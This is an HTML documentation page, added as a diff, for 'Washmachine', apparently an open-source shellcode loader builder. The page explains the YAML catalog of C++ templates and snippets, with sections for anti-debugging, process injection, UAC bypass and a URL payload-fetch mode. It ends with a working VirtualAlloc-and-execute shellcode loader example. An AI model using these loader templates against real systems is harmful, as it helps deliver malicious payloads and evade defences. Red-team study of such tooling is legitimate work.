@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YAML Catalog Reference // Washmachine</title>
+    <link rel="stylesheet" href="css/cyberpunk.css">
+</head>
+<body>
+    <div class="scanlines"></div>
+    <div class="glitch-overlay"></div>
+
+    <nav class="cyber-nav">
+        <div class="nav-container">
+            <div class="logo">
+                <span class="glitch" data-text="WASHMACHINE">WASHMACHINE</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="index.html">HOME</a></li>
+                <li><a href="features.html">FEATURES</a></li>
+                <li><a href="cli.html">CLI REFERENCE</a></li>
+                <li><a href="yaml.html" class="active">YAML CATALOG</a></li>
+                <li><a href="architecture.html">ARCHITECTURE</a></li>
+                <li><a href="building.html">BUILDING</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="page-header">
+        <div class="container">
+            <h1 class="page-title">// YAML CATALOG REFERENCE</h1>
+            <p class="page-subtitle">Complete guide to the vx_api_snippets.yaml configuration file</p>
+        </div>
+    </div>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// OVERVIEW</h2>
+
+            <div class="info-box">
+                <div class="info-icon">📄</div>
+                <div class="info-content">
+                    <p>All templates and snippets live in a <strong>single file</strong>: <code>Assets/vx_api_snippets.yaml</code></p>
+                    <p>This is the only file you need to edit to add new techniques, templates, or UI controls. No code recompilation required.</p>
+                </div>
+            </div>
+
+            <h3 class="subsection-title">File Structure</h3>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="comment"># One top-level templates list and one top-level sections list</span>
+
+<span class="keyword">templates:</span>
+  - <span class="keyword">id:</span> <span class="string">"my-template"</span>
+    <span class="keyword">display:</span> <span class="string">"My Template"</span>
+    <span class="keyword">content:</span> |
+      <span class="comment"># C++ template code</span>
+
+<span class="keyword">sections:</span>
+  - <span class="keyword">header:</span> <span class="string">"My Section"</span>
+    <span class="keyword">template:</span> <span class="string">"mysection"</span>
+    <span class="keyword">items:</span>
+      - <span class="keyword">id:</span> <span class="string">"snippet1"</span>
+        <span class="keyword">snippet:</span> |
+          <span class="comment">// C++ code</span></pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// TEMPLATES</h2>
+
+            <p class="lead">Templates define the overall C++ structure and which placeholders are available.</p>
+
+            <div class="yaml-reference">
+                <h3>Template Structure</h3>
+                <div class="terminal-window">
+                    <div class="terminal-body">
+<pre><span class="keyword">templates:</span>
+  - <span class="keyword">id:</span> <span class="string">"my-template"</span>           <span class="comment"># Unique, kebab-case recommended</span>
+    <span class="keyword">display:</span> <span class="string">"My Template"</span>      <span class="comment"># Shown in UI dropdown</span>
+    <span class="keyword">description:</span> <span class="string">"What it does"</span> <span class="comment"># Tooltip / info text</span>
+    <span class="keyword">preamble:</span> |                 <span class="comment"># Optional - C++ before main()</span>
+      <span class="comment">// Shared helpers, typedefs, etc.</span>
+    <span class="keyword">content:</span> |                  <span class="comment"># Required - the C++ template</span>
+      #include &lt;windows.h&gt;
+
+      {{SNIPPET_INCLUDES}}
+      {{PREAMBLE}}
+      {{SNIPPET_IMPLEMENTATIONS}}
+
+      INT main(VOID)
+      {
+          {{SHELLCODE_SOURCE}}
+          {{SHELLCODE_EXECUTION}}
+          return 0;
+      }
+    <span class="keyword">placeholders:</span>               <span class="comment"># Declares every {{TOKEN}}</span>
+      - <span class="keyword">name:</span> <span class="string">"SHELLCODE_SOURCE"</span>
+        <span class="keyword">kind:</span> <span class="string">system</span>
+      - <span class="keyword">name:</span> <span class="string">"SHELLCODE_EXECUTION"</span>
+        <span class="keyword">kind:</span> <span class="string">snippet</span>
+        <span class="keyword">snippetTemplate:</span> <span class="string">"SHELLCODEEXECUTION"</span></pre>
+                    </div>
+                </div>
+
+                <h3>Placeholder Fields</h3>
+                <table class="reference-table">
+                    <thead>
+                        <tr>
+                            <th>FIELD</th>
+                            <th>VALUES</th>
+                            <th>DESCRIPTION</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>name</code></td>
+                            <td>Any string</td>
+                            <td>Must match the <code>{{TOKEN}}</code> used in content exactly</td>
+                        </tr>
+                        <tr>
+                            <td><code>kind</code></td>
+                            <td><code>system</code> | <code>snippet</code></td>
+                            <td>System = filled automatically; Snippet = from user selection</td>
+                        </tr>
+                        <tr>
+                            <td><code>snippetTemplate</code></td>
+                            <td>Section key</td>
+                            <td>Required when <code>kind: snippet</code>. Identifies which section supplies code</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Preamble</h3>
+                <p>Optional C++ source placed at file scope <strong>before</strong> <code>main()</code>. Inject using <code>{{PREAMBLE}}</code> placeholder.</p>
+
+                <div class="grid-2">
+                    <div class="card">
+                        <h4>Use For:</h4>
+                        <ul>
+                            <li>Shared type definitions</li>
+                            <li>Helper function implementations</li>
+                            <li><code>#pragma comment(lib, ...)</code> directives</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h4>Example:</h4>
+                        <div class="terminal-window small">
+                            <div class="terminal-body">
+<pre><span class="keyword">preamble:</span> |
+  static BOOL IsElevated()
+  {
+      BOOL elevated = FALSE;
+      HANDLE token;
+      if (OpenProcessToken(GetCurrentProcess(),
+                           TOKEN_QUERY, &token))
+      {
+          TOKEN_ELEVATION te{};
+          DWORD size = sizeof(te);
+          if (GetTokenInformation(token,
+                TokenElevation, &te, size, &size))
+              elevated = te.TokenIsElevated;
+          CloseHandle(token);
+      }
+      return elevated;
+  }</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// SECTIONS</h2>
+
+            <p class="lead">A section is a named group of selectable code snippets that maps to one snippet placeholder in a template.</p>
+
+            <div class="yaml-reference">
+                <h3>Section Structure</h3>
+                <div class="terminal-window">
+                    <div class="terminal-body">
+<pre><span class="keyword">sections:</span>
+  - <span class="keyword">header:</span> <span class="string">"My Technique"</span>      <span class="comment"># Human-readable, shown in UI</span>
+    <span class="keyword">template:</span> <span class="string">"mytechnique"</span>     <span class="comment"># Key for matching</span>
+    <span class="keyword">display:</span> <span class="string">"My Technique"</span>     <span class="comment"># Optional UI label override</span>
+    <span class="keyword">allowMultiple:</span> false        <span class="comment"># Stack multiple items?</span>
+    <span class="keyword">inputs:</span>                     <span class="comment"># Optional UI controls</span>
+      - ...
+    <span class="keyword">items:</span>                      <span class="comment"># Required - selectable snippets</span>
+      - ...</pre>
+                    </div>
+                </div>
+
+                <h3>Item Structure</h3>
+                <div class="terminal-window">
+                    <div class="terminal-body">
+<pre><span class="keyword">items:</span>
+  - <span class="keyword">id:</span> <span class="string">"MySnippetId"</span>           <span class="comment"># Unique within section</span>
+    <span class="keyword">display:</span> <span class="string">"Friendly Name"</span>    <span class="comment"># Shown in combo box</span>
+    <span class="keyword">default:</span> true               <span class="comment"># Pre-selected when section loads</span>
+    <span class="keyword">includes:</span> |                 <span class="comment"># Optional - extra #includes</span>
+      #include &lt;some_header.h&gt;
+    <span class="keyword">implementation:</span> |           <span class="comment"># Optional - functions before main()</span>
+      static BOOL MyHelper()
+      {
+          return TRUE;
+      }
+    <span class="keyword">snippet:</span> |                  <span class="comment"># Required - code at placeholder site</span>
+      if (!MyHelper()) return 0;</pre>
+                    </div>
+                </div>
+
+                <h3>How Items are Assembled</h3>
+                <div class="assembly-flow">
+                    <div class="assembly-step">
+                        <div class="step-num">1</div>
+                        <p><code>includes</code> lines from all selected snippets are deduplicated and injected at <code>{{SNIPPET_INCLUDES}}</code></p>
+                    </div>
+                    <div class="assembly-step">
+                        <div class="step-num">2</div>
+                        <p><code>implementation</code> blocks are concatenated and injected at <code>{{SNIPPET_IMPLEMENTATIONS}}</code></p>
+                    </div>
+                    <div class="assembly-step">
+                        <div class="step-num">3</div>
+                        <p><code>snippet</code> is injected directly at the named placeholder (e.g., <code>{{ANTI_DEBUGGING}}</code>)</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// INPUTS</h2>
+
+            <p class="lead">Sections can declare UI input controls that render alongside the snippet selector.</p>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="keyword">inputs:</span>
+  - <span class="keyword">id:</span> <span class="string">"myParamTextBox"</span>        <span class="comment"># Substitution key in snippet</span>
+    <span class="keyword">type:</span> <span class="string">"textbox"</span>             <span class="comment"># Currently only "textbox"</span>
+    <span class="keyword">label:</span> <span class="string">"Parameter label"</span>    <span class="comment"># Shown next to input</span>
+    <span class="keyword">placement:</span> <span class="string">"before"</span>         <span class="comment"># "before" or "after" selector</span>
+    <span class="keyword">width:</span> 240                  <span class="comment"># Control width in pixels</span>
+    <span class="keyword">required:</span> true              <span class="comment"># Validation - warns if empty</span>
+    <span class="keyword">defaultValue:</span> <span class="string">"notepad.exe"</span> <span class="comment"># Pre-filled value</span>
+    <span class="keyword">infoAction:</span> <span class="string">"MyInfo"</span>        <span class="comment"># Optional info button action</span>
+    <span class="keyword">infoButtonLabel:</span> <span class="string">"?"</span>        <span class="comment"># Info button label</span></pre>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <div class="info-icon">💡</div>
+                <div class="info-content">
+                    <h4>Input Substitution</h4>
+                    <p>The input <code>id</code> is injected into the snippet text as a literal parameter. For example, a snippet referencing <code>$processname$</code> combined with an input whose <code>id</code> is <code>processNameTextBox</code> (and value <code>notepad.exe</code>) becomes <code>notepad.exe</code> at the call site.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// SYSTEM PLACEHOLDERS</h2>
+
+            <p class="lead">These are filled automatically by the engine and should be declared as <code>kind: system</code>.</p>
+
+            <table class="reference-table">
+                <thead>
+                    <tr>
+                        <th>PLACEHOLDER</th>
+                        <th>WHAT GETS INJECTED</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>{{SHELLCODE_SOURCE}}</code></td>
+                        <td>The encoded shellcode array declaration (or web payload body in URL mode)</td>
+                    </tr>
+                    <tr>
+                        <td><code>{{SHELLCODE_URL}}</code></td>
+                        <td>URL-mode fetch code (empty in file/raw/test modes)</td>
+                    </tr>
+                    <tr>
+                        <td><code>{{PREAMBLE}}</code></td>
+                        <td>The template's own preamble string</td>
+                    </tr>
+                    <tr>
+                        <td><code>{{SNIPPET_INCLUDES}}</code></td>
+                        <td>Deduplicated <code>#include</code> lines from all selected snippets</td>
+                    </tr>
+                    <tr>
+                        <td><code>{{SNIPPET_IMPLEMENTATIONS}}</code></td>
+                        <td>All <code>implementation</code> blocks concatenated, placed before <code>main()</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>{{PROCESS_LOOKUP_HELPER}}</code></td>
+                        <td><code>GetProcessOrThreadId()</code> helper (when process injection active)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// SNIPPET TEMPLATE KEYS</h2>
+
+            <p class="lead">The <code>snippetTemplate</code> field must loosely match the <code>template</code> field of a section.</p>
+
+            <table class="reference-table">
+                <thead>
+                    <tr>
+                        <th>CONSTANT</th>
+                        <th>NORMALIZED FORM</th>
+                        <th>SECTION TEMPLATE</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>ANTIDEBUGGING</code></td>
+                        <td>antidebugging</td>
+                        <td>antidebugging</td>
+                    </tr>
+                    <tr>
+                        <td><code>PSINJECTION</code></td>
+                        <td>psinjection</td>
+                        <td>psinjection</td>
+                    </tr>
+                    <tr>
+                        <td><code>SHELLCODEEXECUTION</code></td>
+                        <td>shellcodeexecution</td>
+                        <td>shellcodeexecution</td>
+                    </tr>
+                    <tr>
+                        <td><code>UACB</code></td>
+                        <td>uacb</td>
+                        <td>uacb</td>
+                    </tr>
+                    <tr>
+                        <td><code>GUARDRAIL</code></td>
+                        <td>guardrail</td>
+                        <td>guardrail</td>
+                    </tr>
+                    <tr>
+                        <td><code>GENERICSHELLCODE</code></td>
+                        <td>genericshellcode</td>
+                        <td>genericshellcode</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="info-box">
+                <div class="info-icon">⚡</div>
+                <div class="info-content">
+                    <h4>Custom Section Types</h4>
+                    <p>You can add entirely <strong>custom section types</strong> just by giving them a unique <code>snippetTemplate</code> key, declaring that key in a template placeholder, and adding the section with a matching <code>template</code> value. No C# changes needed!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="container">
+            <h2 class="section-title">// SPECIAL SUBSTITUTIONS</h2>
+
+            <p class="lead">Inside a snippet's <code>snippet</code> field, the engine performs these text replacements at render time:</p>
+
+            <table class="reference-table">
+                <thead>
+                    <tr>
+                        <th>TOKEN</th>
+                        <th>REPLACED WITH</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>$psname$</code></td>
+                        <td>Value of the <code>PsInjPsNameTextBox</code> input (process injection target)</td>
+                    </tr>
+                    <tr>
+                        <td><code>__GUARDRAIL_PARAM__</code></td>
+                        <td>Value of the <code>guardrailParamTextBox</code> input (guardrail condition)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <section class="section section-dark">
+        <div class="container">
+            <h2 class="section-title">// COMPLETE EXAMPLE</h2>
+
+            <div class="terminal-window">
+                <div class="terminal-body">
+<pre><span class="comment"># Minimal template with one execution snippet</span>
+
+<span class="keyword">templates:</span>
+  - <span class="keyword">id:</span> <span class="string">"shellcode-minimal"</span>
+    <span class="keyword">display:</span> <span class="string">"Shellcode Minimal"</span>
+    <span class="keyword">description:</span> <span class="string">"Bare VirtualAlloc loader"</span>
+    <span class="keyword">content:</span> |
+      #define WIN32_LEAN_AND_MEAN
+      #include &lt;windows.h&gt;
+
+      {{SNIPPET_INCLUDES}}
+      {{SNIPPET_IMPLEMENTATIONS}}
+
+      INT main(VOID)
+      {
+          {{SHELLCODE_SOURCE}}
+          {{SHELLCODE_EXECUTION}}
+          return 0;
+      }
+    <span class="keyword">placeholders:</span>
+      - <span class="keyword">name:</span> <span class="string">"SNIPPET_INCLUDES"</span>
+        <span class="keyword">kind:</span> <span class="string">system</span>
+      - <span class="keyword">name:</span> <span class="string">"SNIPPET_IMPLEMENTATIONS"</span>
+        <span class="keyword">kind:</span> <span class="string">system</span>
+      - <span class="keyword">name:</span> <span class="string">"SHELLCODE_SOURCE"</span>
+        <span class="keyword">kind:</span> <span class="string">system</span>
+      - <span class="keyword">name:</span> <span class="string">"SHELLCODE_EXECUTION"</span>
+        <span class="keyword">kind:</span> <span class="string">snippet</span>
+        <span class="keyword">snippetTemplate:</span> <span class="string">"SHELLCODEEXECUTION"</span>
+
+<span class="keyword">sections:</span>
+  - <span class="keyword">header:</span> <span class="string">"Shellcode Execution"</span>
+    <span class="keyword">template:</span> <span class="string">"shellcodeexecution"</span>
+    <span class="keyword">allowMultiple:</span> false
+    <span class="keyword">items:</span>
+      - <span class="keyword">id:</span> <span class="string">"VirtualAllocFuncPtr"</span>
+        <span class="keyword">display:</span> <span class="string">"VirtualAlloc + function pointer"</span>
+        <span class="keyword">default:</span> true
+        <span class="keyword">snippet:</span> |
+          void* mem = VirtualAlloc(NULL, code_blob_len,
+                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (!mem) return -1;
+          memcpy(mem, code_blob, code_blob_len);
+          DWORD old;
+          VirtualProtect(mem, code_blob_len, PAGE_EXECUTE_READWRITE, &old);
+          ((void(*)())mem)();
+          VirtualFree(mem, 0, MEM_RELEASE);</pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-section">
+                    <h4>WASHMACHINE</h4>
+                    <p>Shellcode loader builder framework</p>
+                    <p class="copyright">© 2026 // Open Source</p>
+                </div>
+                <div class="footer-section">
+                    <h4>DOCUMENTATION</h4>
+                    <ul>
+                        <li><a href="features.html">Features</a></li>
+                        <li><a href="cli.html">CLI Reference</a></li>
+                        <li><a href="yaml.html">YAML Catalog</a></li>
+                        <li><a href="architecture.html">Architecture</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>RESOURCES</h4>
+                    <ul>
+                        <li><a href="building.html">Building</a></li>
+                        <li><a href="#">GitHub Repository</a></li>
+                        <li><a href="#">Report Issues</a></li>
+                        <li><a href="#">License</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/cyberpunk.js"></script>
+</body>
+</html>
